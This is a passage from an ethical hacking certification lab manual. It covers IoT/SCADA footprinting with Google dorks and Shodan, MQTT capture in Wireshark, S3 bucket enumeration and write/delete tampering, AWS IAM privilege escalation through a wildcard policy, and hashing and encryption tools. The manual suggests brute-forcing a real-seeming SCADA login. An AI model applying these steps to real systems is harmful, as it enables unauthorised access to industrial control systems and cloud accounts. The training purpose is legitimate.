In this task, we will focus on performing footprinting on the MQTT protocol, which is a machine-to-machine (M2M)/“Internet of Things” connectivity protocol. It is useful for connections with remote locations where a small code footprint is required and/or network bandwidth is at a premium.

You can also select a protocol or device of your choice to perform footprinting on it.

By default Windows 11 machine selected, click Ctrl+Alt+Delete.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows 11 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

If Welcome to Windows wizard appears, click Continue and in Sign in with Microsoft wizard, click Cancel.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Launch any browser, here, we are using Mozilla Firefox. In the address bar of the browser place your mouse cursor and type https://www.whois.com/whois/ and press Enter.

The Whois Domain Lookup page appears; type www.oasis-open.org in the search field and click SEARCH.

Oasis is an organization that has published the MQTT v5.0 standard, which represents a significant leap in the refinement and capability of the messaging protocol that already powers IoT.

Screenshot

The result appears, displaying the following information, as shown in the screenshots: Domain Information, Registrant Contact, and Raw Whois Data.

This information is about the organization that has developed the MQTT protocol, and it might help keep track of the modifications and version changes of the target protocol.

yjecbsin.jpg

1wleaxzk.jpg

Whois lookup reveals available information on a hostname, IP address, or domain.

Now, open a new tab, and type https://www.exploit-db.com/google-hacking-database in the address bar, and press Enter.

The Google Hacking Database page appears; type SCADA in the Quick Search field and press Enter.

The result appears, which displays the Google dork related to SCADA, as shown in the screenshot.

4bxgj1qy.jpg

Now, we will use the dorks obtained in the previous step to query results in Google.

Open a new tab and type https://www.google.com in the address bar, and press Enter.

In the search field, type "login" intitle:"scada login" and click the Google Search button.

2pnclowk.jpg

The search result appears; click any link (here, SCADA :: seamtec SCADA login ::).

Screenshot

Advanced Google hacking refers to the art of creating complex search engine queries by employing advanced Google operators to extract sensitive or hidden information about a target company from the Google search results.

The seamtec SCADA login page appears, as shown in the screenshot.

In the login form, you can brute-force the credentials to gain access to the target SCADA system.

Screenshot

Similarly, you can use advanced search operators such as intitle:"index of" scada to search sensitive SCADA directories that are exposed on sites.

Now, in the browser window, open a new tab type https://account.shodan.io/login in the address bar, and press Enter.

The Login with Shodan page appears; enter your username and password in the Username and Password fields, respectively; and click Login.

Go to the Register option to register yourself if you do not have an existing account.

Screenshot

The Account Overview page appears, which displays the account-related information.

If the Would you like Firefox to save this login for shodan.io? notification appears, click Don’t Save.

The Shodan main page appears; type port:1883 in the address bar and press Enter.

Port 1883 is the default MQTT port; 1883 is defined by IANA as MQTT over TCP.

Screenshot

The result appears, displaying the list of IP addresses having port 1883 enabled, as shown in the screenshot.

Click on any IP address to view its detailed information.

zondopu5.jpg

Detailed results for the selected IP address appears, displaying information regarding Ports, Services, Hostnames, ASN, etc. as shown in the screenshot.

oocraoq4.jpg

Similarly, you can gather additional information on a target device using the following Shodan filters:

Search for Modbus-enabled ICS/SCADA systems:

port:502

Search for SCADA systems using PLC name:

“Schneider Electric”

Search for SCADA systems using geolocation:

SCADA Country:"US"

Using Shodan, you can obtain the details of SCADA systems that are used in water treatment plants, nuclear power plants, HVAC systems, electrical transmission systems, home heating systems, etc.

This concludes the demonstration of gathering information on a target device using various techniques such as Whois lookup, advanced Google hacking, and Shodan search engine.

Close all open windows and document all the acquired information.

########
Lab 2: Capture and Analyze IoT Device Traffic
########

========
Task 1: Capture and Analyze IoT Traffic using Wireshark
========

MQTT is a lightweight messaging protocol that uses a publish/subscribe communication pattern. Since the protocol is meant for devices with a low-bandwidth, it is considered ideal for machine-to-machine (M2M) communication or IoT applications. We can create virtual IoT devices over the virtual network using the Bevywise IoT simulator on the client side and communicate these devices to the server using the MQTT Broker web interface. This interface collects data and displays the status and messages of connected devices over the network.

Here, we use Wireshark to capture and analyze traffic between IoT devices.

To install the MQTT Broker on the Windows Server 2019, click Windows Server 2019 to launch Windows Server 2019 machine, and then click Ctrl+Alt+Delete link to login.

Screenshot

By default Administrator account is selected, type Pa$$w0rd in the Password field and press Enter to login.

Screenshot

If the network screen appears, click Yes.

Navigate to Z:\CEH-Tools\CEHv12 Module 18 IoT and OT Hacking\Bevywise IoT Simulator folder and double-click on the Bevywise_MQTTRoute_Win_64.exe file.

Screenshot

The Open File - Security Warning popup appears. Click Run.

The Setup – MQTTRoute 2.0 window opens. Select I accept the agreement and click on Next.

Screenshot

Select Destination Location page appears, without making any changes to the default installation location, click on Next.

In the next window, click Install to complete the installation.

Screenshot

The installation completes, click on Finish. Ensure that Launch Bevywise_MQTTRoute_Win_64 is checked.

Screenshot

The MQTTRoute will execute and the command prompt will appear. You can see the TCP port using 1883.

Screenshot

We have installed MQTT Broker successfully and leave the Bevywise MQTT running.

To create IoT devices, we must install the IoT simulator on the client machine.

Click Windows Server 2022 to launch Windows Server 2022 machine. Click Ctrl+Alt+Delete.

Screenshot

By default CEH\Administrator account is selected, type Pa$$w0rd in the Password field and press Enter to login.

Screenshot

If the network screen appears, click Yes.

Navigate to Z:\CEH-Tools\CEHv12 Module 18 IoT and OT Hacking\Bevywise IoT Simulator folder and double-click on the Bevywise_IoTSimulator_Win_64.exe file.

Screenshot

The Open File - Security Warning popup appears. Click Run..

The Setup-IoTSimulator 2.1 setup wizard opens. Select I accept the agreement and click on Next to continue.

Screenshot

Keeping the default destination unchanged, click on Next.

The Ready to install screen appears, click on Install

Screenshot

Click on Finish to complete the installation.

Screenshot

Bevywise IoT Simulator is installed successfully. To launch the IoT simulator, navigate to the C:\Bevywise\IotSimulator\bin directory and double-click on the runsimulator.bat file.

Screenshot

Upon double-clicking the runsimulator.bat file opens in the command prompt. If How do you want to open this? pop-up appears, select Microsoft Edge browser and click OK to open the URL http://127.0.0.1:9000/setnetwork?network=HEALTH_CARE.

If the URL directly opens in Microsoft Edge browser, then continue.

The web interface of the IoT Simulator opens in Edge browser. In the IoT Simulator, you can view the default network named HEALTH_CARE and several devices.

Screenshot

Next, we will create a virtual IoT network and virtual IoT devices. Click on the menu icon and select the +New Network option.

lxvmuqgy.jpg

The Create New Network popup appears. Type any name (here, CEH_FINANCE_NETWORK) and description. Click on Create.

Screenshot

In the next screen, we will setup the Simulator Settings. Set the Broker IP Address as 10.10.1.19 (the IP address of the Windows Server 2019 ). Since we have installed the Broker on the web server, the created network will interact with the server using MQTT Broker. Do not change default settings and click on Save.

Screenshot

To proceed with the network creation, click on Yes.

Screenshot

If Configuration Saved pop-up appears. Click on OK to continue. This step completes the creation of the virtual IoT network.

To add IoT devices to the created network, click on the Add blank Device button.

Screenshot

The Create New Device popup opens. Type the device name (here, we use Temperature_Sensor), enter Device Id (here, we use TS1), provide a Description and click on Save.

Screenshot

The device will be added to the CEH_FINANCE_NETWORK.

Screenshot

To connect the Network and the added devices to the server or Broker, click on the Start Network red color circular icon in right corner.

Screenshot

When a connection is established between the network and the added devices and the web server or the MQTT Broker, the red button turns into green.

Screenshot

Next, switch to the Windows Server 2019 machine. Since the Broker was left running, you can see a connection request from machine 10.10.1.22 for the device TS1.

Screenshot

Switch back to Windows Server 2022 machine.

Next, we will create the Subscribe command for the device Temperature_Sensor.

Click on the Plus icon in the top right corner and select the Subscribe to Command option.

Screenshot

The Subscribe for command - TS1 popup opens. Select On start under the Subscribe on tab, type High_Tempe under the Topic tab, and select 1 Atleast once below the Qos option. Click on Save.

Screenshot

Scroll down the page, you can see the Topic added under the Subscribe to Commands section.

Screenshot

Next, we will capture the traffic between the virtual IoT network and the MQTT Broker to monitor the secure communication.

Minimise the Edge browser. Click on Type here to search at the bottom left of the desktop, type wireshark and select Wireshark from the results to launch the Wireshark from the application list.

Screenshot

The Wireshark Application window appears, select the Ethernet as interface.

Make sure you have selected interface which has 10.10.1.22 as the IP address.

If Software update popup appears click on Skip this version.

Screenshot

Click on the Start Wireshark icon to start the capturing packets, leave the Wireshark running.

Leave the IoT simulator running and switch to the Windows Server 2019 machine.

Minimise all opened applications and windows, Open Chrome browser, type http://localhost:8080 and press Enter.

Do not use Internet Explorer web browser to open the above URL.

Screenshot

As soon as you press Enter, the MQTTRoute Sign in page appears, keep the default credential unchanged and click on SIGN IN.

Screenshot

Navigate to Devices menu. You will be able to see the connected device TS1 in the left pane.

Screenshot

Now, we will send the command to TS1 using the High_Tempe topic.

Go to the Command Send section, select Topic as High_Tempe, type Alert for High Temperature and click on the Send button.

Screenshot

The alert popup appears, then click on OK.

Screenshot

The message has been sent to the device using this topic.

Next, switch to Windows Server 2022 machine.

We have left the IoT simulator running in the web browser. To see the alert message, maximise the Edge browser and expand the arrow under the connected Temperature_Sensor, Device Log section.

Screenshot

You can see the alert message "Alert for High Temperature"

Screenshot

To verify the communication, we have executed Wireshark application, switch to the Wireshark traffic capturing window.

Type mqtt under the filter field and press Enter. To display only the MQTT protocol packets.

Screenshot

Select any Publish Message packet from the Packet List pane. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.

Under the MQ Telemetry Transport Protocol nodes, you can observe details such as Msg Len, Topic Length, Topic, and Message.

Publish Message can be used to obtain the message sent by the MQTT client to the broker.

Screenshot

Note: After establishing a successful connection with the MQTT broker, the MQTT client can publish messages. The headers in the Publish Message packet are given below:

Header Flags: Contains information regarding the MQTT control packet type.
DUP flag: If the DUP flag is 0, it indicates the first attempt at sending this PUBLISH packet; if the flag is 1, it indicates a possible re-attempt at sending the message.
QoS: Determines the assurance level of a message.
Retain Flag: If the retain flag is set to 1, the server must store the message and its QoS, so it can cater to future subscriptions matching the topic.
Topic Name: Contains a UTF-8 string that can also include forward slashes when it needs to be hierarchically structured.
Message: Contains the actual data to be transmitted.
Payload: Contains the message that is being published.
Select any Publish Release packet from the Packet List pane. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.

Under the MQ Telemetry Transport Protocol nodes, you can observe details such as Msg Len, Message Type, Message Identifier.

Screenshot

Note: A Publish Release (PUBREL) packet is the response to a Publish Received (PUBREC) packet.

Now, scroll down, look for the Publish Complete packet from the Packet List pane, and click on it. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.

Under the MQ Telemetry Transport Protocol nodes, you can observe details such as Msg Len and Message Identifier.

Screenshot

Note: The Publish Complete (PUBCOMP) packet is the response to a Publish Release (PUBREL) packet.

Now, scroll down, look for the Publish Received packet from the Packet List pane, and click on it. In the Packet Details pane at the middle of the window, expand the Transmission Control Protocol, MQ Telemetry Transport Protocol, and Header Flags nodes.

Under the MQ Telemetry Transport Protocol nodes, you can observe details such as Message Type, Msg Len and Message Identifier.

Screenshot

Similarly you can select Ping Request, Ping Response and Publish Ack packets and observe the details.

This concludes the demonstration of capturing and analyzing MQTT protocol packets. Here, we analyzed different processes involved in the communication between an MQTT client and an MQTT broker using Wireshark. Understanding these metrics as well as the workflow can help you in quickly identifying the MQTT-related issues.

Close all open windows and document all the acquired information.

########
Module 19: Cloud Computing
########

########
Lab 1: Perform S3 Bucket Enumeration using Various S3 Bucket Enumeration Tools
########

========
Task 1: Enumerate S3 Buckets using lazys3
========

lazys3 is a Ruby script tool that is used to brute-force AWS S3 buckets using different permutations. This tool obtains the publicly accessible S3 buckets and also allows you to search the S3 buckets of a specific company by entering the company name.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

If a Question pop-up window appears asking for you to update the machine, click No to close the window.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

In the terminal window, type cd lazys3-master/ and press Enter to navigate to the cloned repository.

We have already downloaded lazys3 tool in the Lab setup.

Screenshot

In the lazys3 folder, type ls and press Enter to list the folder content.

The folder content is displayed; here, we will run the lazys3.rb script to find the public S3 buckets.

Screenshot

Now, type ruby lazys3.rb and press Enter.

A list of public S3 buckets is displayed, as shown in the screenshot.

Screenshot

Press Ctrl+Z to stop the script.

Screenshot

You can search the S3 buckets of specific company. To do so, type ruby lazys3.rb [Company] and press Enter.

Here, the target company name is HackerOne; you can enter the company name of your choice.

The result appears, showing the obtained list of S3 buckets of the specified company.

It will take some time to obtain a complete list of the available S3 buckets.

Screenshot

Press Ctrl+Z to stop running the script.

This concludes the demonstration of enumerating public S3 buckets.

Close all open windows and document all acquired information.

========
Task 2: Enumerate S3 Buckets using S3Scanner
========

Here, we will use the S3Scanner tool to enumerate open S3 buckets.

Click the MATE Terminal icon in the menu to launch the terminal.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Type cd S3Scanner/ and press Enter to navigate to the cloned repository.

By default, the tool is cloned to the root directory.

In the S3Scanner folder, type pip3 install -r requirements.txt and press Enter to install the required dependencies.

Screenshot

After the successful installation of the dependencies, in the terminal window, type python3 ./s3scanner.py sites.txt and press Enter to run the tool.

Here, sites.txt is a text file containing the target website URL that is scanned for open S3 buckets. You can edit the sites.txt file to enter the target website URL of your choice.

The result appears, displaying a list of public S3 buckets, as shown in the screenshot.

You might encounter the following error: “AWS credentials not configured.” Ignore the error, as we will install and configure the AWS CLI in the next lab.

Screenshot

This concludes the demonstration of enumerating S3 buckets using the S3Scanner tool.

You can also use other S3 bucket enumeration tools such as S3Inspector (https://github.com), s3-buckets-bruteforcer (https://github.com), Mass3 (https://github.com), Bucket Finder (https://digi.ninja), and s3recon (https://github.com) to perform S3 bucket enumeration for a target website or company.

Close all open windows and document all acquired information.

########
Lab 2: Exploit S3 Buckets
########

========
Task 1: Exploit Open S3 Buckets using AWS CLI
========

The AWS command line interface (CLI) is a unified tool for managing AWS services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.

Before starting this task, you must create your AWS account (https://aws.amazon.com).

In the Parrot Security machine, click the MATE Terminal icon in the menu to launch the terminal.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the terminal window, type pip3 install awscli and press Enter to install AWS CLI.

Screenshot

Once the installation is completed, type aws --help and press Enter to check whether AWS CLI is properly installed.

Here, the awscli is already installed.

Ignore the errors (if you find any).

Screenshot

Now, we need to configure AWS CLI. To configure AWS CLI in the terminal window, type aws configure and press Enter.

Screenshot

It will ask for the following details:

AWS Access Key ID
AWS Secret Access Key
Default region name
Default output format
To provide these details, you need to login to your AWS account.

Click Firefox icon from the top-section of the Desktop.

Screenshot

Login to your AWS account that you created at the beginning of this task. Click the Firefox browser icon in the menu, type https://console.aws.amazon.com in the address bar, and press Enter.

If you do not have an AWS account, create one with the Basic Free Plan, and then proceed with the tasks.

The Amazon Web Services Sign-In page appears; type your email account in the Email address field and click Next.

wv3a2ec2.jpg

Type your AWS account password in the Password field and click Sign in.

If a Security check window appears, enter the captcha and click on Submit.

h55rs35d.jpg

Click the AWS account drop-down menu and click Security Credentials, as shown in the screenshot.

4kvsnxr0.jpg

Click Access keys (access key ID and secret access key) in the Your Security Credentials section.

b3yw0odx.jpg

Click the Create New Access Key button.

1w2wwlgel.jpg

A Create Access Key pop-up appears, stating that your access key has been successfully created. Click the Show Access Key link to view the access key.

Copy the Access Key ID displayed by pressing Ctrl+C on your keyboard and switch to the Terminal window.

wfvf2rzz.jpg

In the terminal window, right-click your mouse; select Paste from the context menu to paste the copied Access Key ID and press Enter. It will prompt you to the AWS Secret Access Key. Switch to your AWS Account in the browser.

qbbpvlpf.jpg

In the Create Access Key pop-up, select the Secret Access Key displayed, copy it by pressing Ctrl+C on your keyboard, and minimize the browser window. Switch to the Terminal window.

In the terminal window, right-click your mouse, select Paste from the context menu to paste the copied Secret Access Key and press Enter. It will prompt you for the default region name.

In the Default region name field, type eu-west-1 and press Enter.

The Default output format prompt appears; leave it as default and press Enter.

gypkzgyd.jpg

For demonstration purposes, we have created an open S3 bucket with the name certifiedhacker1 in the AWS service. We are going to use that bucket in this task.

The public S3 buckets can be found during the enumeration phase.

Let us list the directories in the certifiedhacker1 bucket. In the terminal window, type aws s3 ls s3://[Bucket Name] (here, Bucket Name is certifiedhacker1) and press Enter.

The bucket name may be different in your lab environment depending on the bucket you are targeting.

This will show you the list of directories in the certifiedhacker1 S3 bucket, as shown in the screenshot.

Screenshot

Now, maximize the browser window, type certifiedhacker1.s3.amazonaws.com in the address bar, and press Enter.

This will show you the complete list of directories and files available in this bucket.

Screenshot

Minimize the browser window and switch to Terminal.

Let us move some files to the certifiedhacker1 bucket. To do this, in the terminal window, type echo “You have been hacked” >> Hack.txt and press Enter.

By issuing this command, you are creating a file named Hack.txt.

Screenshot

Let us try to move the Hack.txt file to the certifiedhacker1 bucket. In the terminal window, type aws s3 mv Hack.txt s3://certifiedhacker1 and press Enter.

You have successfully moved the Hack.txt file to the certifiedhacker1 bucket.

Screenshot

To verify whether the file is moved, switch to the browser window and maximize it. Reload the page.

You can observe that the Hack.txt file is moved to the certifiedhacker1 bucket, as shown in the screenshot.

Screenshot

Minimize the browser window and switch to the Terminal window.

Let us delete the Hack.txt file from the certifiedhacker1 bucket. In the terminal window, type aws s3 rm s3://certifiedhacker1/Hack.txt and press Enter.

By issuing this command, you have successfully deleted the Hack.txt file from the certifiedhacker1 bucket.

Screenshot

To verify whether the file is deleted, switch to the browser window and reload the page.

The Hack.txt file is deleted from the certifiedhacker1 bucket.

Screenshot

Thus, you can add or delete files from open S3 buckets.

This concludes the demonstration of exploiting public S3 buckets.

Close all open windows and document all acquired information.

########
Lab 3: Perform Privilege Escalation to Gain Higher Privileges
########

========
Task 1: Escalate IAM User Privileges by Exploiting Misconfigured User Policy
========

In the Parrot Security machine, click the MATE Terminal icon in the menu to launch the terminal.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the terminal window, type aws configure and press Enter.

Enter the details of the target IAM user’s access key in the AWS Access Key ID field and press Enter. Similarly, in the AWS Secret Access Key filed, enter the target IAM user’s secret access key and press Enter.

The AWS Access Key ID and AWS Secret Access Key of the target user’s account can be obtained using various social engineering techniques, as discussed in Module 09 Social Engineering.

In the Default region name field, type us-east-2 and press Enter. In the Default output format field, type json and press Enter.

Screenshot

After configuring the AWS CLI, we create a user policy and attach it to the target IAM user account to escalate the privileges.

In the terminal window, type vim user-policy.json and press Enter.

This command will create a file named user-policy in the root directory.

Screenshot

A command line text editor appears; press I and type the script given below:

{

"Version":"2012-10-17",

"Statement": [
{

    "Effect":"Allow",

    "Action":"*",

    "Resource":"*"

}
]
}

This is an AdministratorAccess policy that gives administrator access to the target IAM user.

Ignore the $ symbols in the script.

After entering the script given in the previous step, press the Esc button. Then, type :wq! and press Enter to save the text document.

Screenshot

Now, we will attach the created policy (user-policy) to the target IAM user’s account. To do so, type aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json and press Enter.

The created user policy is displayed, showing various details such as PolicyName, PolicyId, and Arn.

l14wgcg2.jpg

In the terminal, type aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy and press Enter.

The above command will attach the policy (user-policy) to the target IAM user account (here, test).

xmnpsvsp.jpg

Now, type aws iam list-attached-user-policies --user-name [Target Username] and press Enter to view the attached policies of the target user (here, test).

The result appears, displaying the attached policy name (user-policy), as shown in the screenshot.

pdqqgeid.jpg

Now that you have successfully escalated the privileges of the target IAM user account, you can list all the IAM users in the AWS environment. To do so, type aws iam list-users and press Enter.

The result appears, displaying the list of IAM users, as shown in the screenshot.

1onk15ji.jpg

Similarly, you can use various commands to obtain complete information about the AWS environment such as the list of S3 buckets, user policies, role policies, and group policies, as well as to create a new user.

List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"

User Policies: aws iam list-user-policies

Role Policies: aws iam list-role-policies

Group policies: aws iam list-group-policies

Create user: aws iam create-user

This concludes the demonstration of escalating IAM user privileges by exploiting a misconfigured user policy.

Close all open windows and document all acquired information.

########
Module 20: Cryptography
########

########
Lab 1: Encrypt the Information using Various Cryptography Tools
########

========
Task 1: Calculate One-way Hashes using HashCalc
========

HashCalc enables you to compute multiple hashes, checksums, and HMACs for files, text, and hex strings. It supports the Secure Hash Algorithm family: MD2, MD4, MD5, SHA1, SHA2 (SHA256, SHA384, SHA512), RIPEMD160, PANAMA, TIGER, CRC32, ADLER32, and the hash used in the peer-to-peer file sharing applications, eDonkey and eMule.

Here, we will use the HashCalc tool to calculate one-way hashes.

Click Windows 11 to switch to the Windows 11 machine. click Ctrl+Alt+Delete to activate it. By default, Admin user profile is selected, type Pa$$w0rd in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

If Welcome to Windows wizard appears, click Continue and in Sign in with Microsoft wizard, click Cancel.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Click Search icon ( search1Icon.jpg) on the Desktop. Type HashCalc in the search field, the HashCalc appears in the results, click Open to launch it.

If the User Account Control pop-up appears, click Yes.

Screenshot

The HashCalc main window appears, as shown in the screenshot.

Screenshot

Minimize the HashCalc window. Navigate to Desktop, right-click on the Desktop window, and navigate to New --> Text Document to create a new text file.

You can create a text file at any location of your choice.

A newly created text file appears; rename it to Test.txt and open it. Write some text in it (here, Hello World !!) and press Ctrl+S to save the file. Close the text file.

Screenshot

Now, switch back to the HashCalc window; ensure that the File option is selected in the Data Format field and click ellipsis icon under the Data filed.

ffdn1usv.jpg

The Find window appears, navigate to the location where you saved the Test.txt file (here, Desktop) and click Open.

lcf5kft2.jpg

The path of the selected file (Test.txt) appears under the Data field. Ensure that the MD5, SHA1, RIPEMD160, and CRC32 hash functions are selected. Click the Calculate button.

Screenshot

The calculated hash values of the Test.txt file appears, as shown in the screenshot.

Screenshot

Minimize the HashCalc window, navigate to Desktop, and double-click the Test.txt file to open it. Modify the file content by writing some text (here, Modified File …!!!) and press Ctrl+S to save it. Close the text file.

Screenshot

Click Search icon ( search1Icon.jpg) on the Desktop. Type HashCalc in the search field, the HashCalc appears in the results, click Open to launch it.

A new HashCalc window appears, perform Steps #6-9

Now, maximize the first HashCalc window and place it beside the second HashCalc window. You can observe changes in the hash values of the text file (Test.txt) before and after the modification, as shown in the screenshot.

Screenshot

In real-time, the HashCalc tool is used to check the integrity of a file where the changes in the hash values indicate that the file content has been modified.

This concludes the demonstration of calculating one-way hashes using HashCalc.

Close all open windows and document all the acquired information.

========
Task 2: Calculate MD5 Hashes using MD5 Calculator
========

MD5 Calculator is a simple application that calculates the MD5 hash of a given file, and it can be used with large files (e.g., multiple gigabytes). It features a progress counter and a text field from which the final MD5 hash can be easily copied to the clipboard. MD5 calculator can be used to check the integrity of a file.

Here, we will use the MD5 Calculator tool to calculate MD5 hashes.

Click Search icon ( search1Icon.jpg) on the Desktop. Type MD5 Cal in the search field, the MD5 Calculator appears in the results, click Open to launch it.

Screenshot

The MD5 Calculator main window appears, as shown in the screenshot.

Screenshot

Click on Add Files in MD5 Calculator window.

In the Open window, navigate to the Desktop and select Test.txt file and click Open.

Screenshot

You can observe the uploaded file path under File section, click on Calculate to get the hash value in Current MD5 value field at the bottom of the window.

Screenshot

Now, click on Copy beside the MD5 value, to copy the hash value from Current MD5 Value field and click on Remove Files to clear the MD5 value.

Now, double-click the Test.txt file from Desktop to open it and change the content of the file by modifying text within (here, Hello World…!!!). Save and close the Test.txt file.

Screenshot

In MD5 Calculator perform Steps #2-5.

Now, paste the previous hash value in the Verify MD5 Value field and click on Compare to compare the MD5 values.

Screenshot

We can see that the MD5 hash values of the file before modification is not equal to the MD5 hash value of the file after modification.

If a person wants to send a file to another person via a medium, they will calculate its hashes and send the file (along with the hash value) to the intended person. When the intended person receives the email, they will download the file and calculate its value using the MD5 Calculator.

The recipient compares the generated hash value with the hash value that was sent through email: if both tally, it is evident that they received the file without any modifications by a third person and that the integrity of the file is intact.

This concludes the demonstration of calculating MD5 hashes using MD5 Calculator.

Close all open windows and document all the acquired information.

========
Task 3: Calculate MD5 Hashes using HashMyFiles
========

Here, we will use the HashMyFiles tool to calculate MD5 hashes.

In Windows 11 machine navigate to E:\CEH-Tools\CEHv12 Module 20 Cryptography\MD5 and MD6 Hash Calculators\HashMyFiles and double click HashMyFiles.exe.

Screenshot

If the Open File - Security Warning pop-up appears, click Run.

The HashMyFiles main window appears, as shown in the screenshot.

Screenshot

In the HashMyFiles window, click File from the menu bar. From the drop-down list, click the Add Folder option.

You can also use the Add Files option to add multiple files.

Screenshot

The Select Folder pop-up appears; click on the ellipsis icon to select the folder you want to encrypt.

Screenshot

The Browse for Folder window appears; navigate to E:\CEH-Tools\CEHv12 Module 20 Cryptography\MD5 and MD6 Hash Calculators\HashMyFiles and select the Sample Files folder; then, click OK.

You can select any folder of your choice that you wish to encrypt.

Screenshot

The location of the selected folder appears in the field; click OK.

Screenshot

A list of files contained in the folder appears, along with their various hash values such as MD5, SHA1, CRC32, etc.

Screenshot

In the HashMyFiles window, click Options from the menu bar and choose Hash Types from the options. You can observe a list of hash functions such as MD5, SHA1, CRC32, SHA-256, SHA-512, and SHA-384.

Screenshot

In real-time, you may share confidential information in the folder in an encrypted form to maintain its integrity.

From the list of hash functions, unselect SHA-256, SHA-512 and SHA-384 hash types one by one.

Screenshot

Here, we will calculate MD5, SHA1 and CRC32 Hash Types.

After selecting the hash functions to be displayed, click Refresh icon refresh.jpg from the menu bar to view the selected hash functions.

o45nc5yv.jpg

Screenshot

This concludes the demonstration of calculating MD5 hashes using HashMyFiles.

You can also use other MD5 and MD6 hash calculators such as MD6 Hash Generator (https://www.browserling.com), All Hash Generator (https://www.browserling.com), MD6 Hash Generator (https://convert-tool.com), and md5 hash calculator (https://onlinehashtools.com) to calculate MD5 and MD6 hashes.

Close all open windows and document all the acquired information.

========
Task 4: Perform File and Text Message Encryption using CryptoForge
========

Here, we will use the CryptoForge tool to encrypt a file and text message.

Click on Windows 11 to switch to the Windows 11 machine. Navigate to E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptography Tools\CryptoForge. Right-click the Confidential.txt file and click Show more options and select Encrypt from the context menu

In this task, we are encrypting the Confidential.txt file, although you can encrypt any file of your choice.

dvdmickn1.jpg

qckiyume1.jpg

The Enter Passphrase - CryptoForge Files dialog-box appears; type a password in the Passphrase field, retype it in the Confirm field, and click OK. The password used in this lab is qwerty@1234.

blsliroa1.jpg

Now, the file will be encrypted in the same location, and the old file will be deleted automatically, as shown in the screenshot.

No one can access this file unless the user provides the password for the encrypted file. You will have to share the password with the user through message, email, or any other means.

yjzmzjhc1.jpg

Let us assume that you shared this file through a shared network drive.

Now, click on Windows Server 2019 to switch to the Windows Server 2019, click Ctrl+Alt+Delete to activate the machine. By default, Administrator profile is selected, type Pa$$w0rd to enter password in the Password field and press Enter to login.

Navigate to Z:\CEHv12 Module 20 Cryptography\Cryptography Tools\CryptoForge. You will observe the encrypted file in this location.

Double-click the encrypted file to decrypt it and view its contents.

Screenshot

The Enter Passphrase - CryptoForge Files dialog-box appears; enter the password that you have provided in Step#2 to encrypt the file and click OK.

Screenshot

Upon entering the password, the file will be successfully decrypted. You may now double-click the text file to view its contents.

Screenshot

So far, you have seen how to encrypt a file and share it with the intended user. Now, we shall share an encrypted message with a user.

In the Windows Server 2019 machine, click the Type here to search icon present in the bottom-left corner of Desktop, type crypto in the search field and click CryptoForge Text from the apps to launch the application.

Screenshot

The CryptoForge Text window appears; type a message and click Encrypt from the toolbar.

Screenshot

The Enter Passphrase - CryptoForge Text dialog-box appears; type a password in the Passphrase field, retype it in the Confirm field, and click OK. The password used in this lab is test@123.

Screenshot

The message that you have typed will be encrypted, as shown in the screenshot.

Screenshot

Now, you need to save the file. Click File in the menu bar and click Save.

Screenshot

The Save As window appears; navigate to Z:\CEHv12 Module 20 Cryptography\Cryptography Tools\CryptoForge, specify the file name as Secret Message.cfd, and click Save.

Screenshot

Close the CryptoForge Text window.

Now, let us assume that you shared the file through the mapped network drive and shared the password to decrypt the file in an email message or through some other means.

Click on Windows 11 to switch to the Windows 11 machine and navigate to E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptography Tools\CryptoForge.

You will observe the encrypted file in this location; double-click the file Secret Message.cfd.

Screenshot

The CryptoForge Text window appears, displaying the message in an encrypted format. Click Decrypt from the toolbar to decrypt it.

Screenshot

The Enter Passphrase - CryptoForge Text dialog-box appears; enter the password you provided in Step#13 to decrypt the message in the Passphrase field and click OK.

Screenshot

The CryptoForge Text window appears, displaying the message in plain-text format, as shown in the screenshot.

In real-time, you may share sensitive information through email by encrypting data using CryptoForge.

Screenshot

This concludes the demonstration of performing file and text message encryption using CryptoForge.

Close all open windows and document all the acquired information.

========
Task 5: Encrypt and Decrypt Data using BCTextEncoder
========

Here, we will use the BCTextEncoder tool to encrypt and decrypt data.

In Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptography Tools\BCTextEncoder and double click BCTextEncoder.exe.

bctext.jpg

The BCTextEncoder Utility window appears, as shown in the screenshot.

Screenshot

To encrypt the text, insert text in the clipboard.

Or

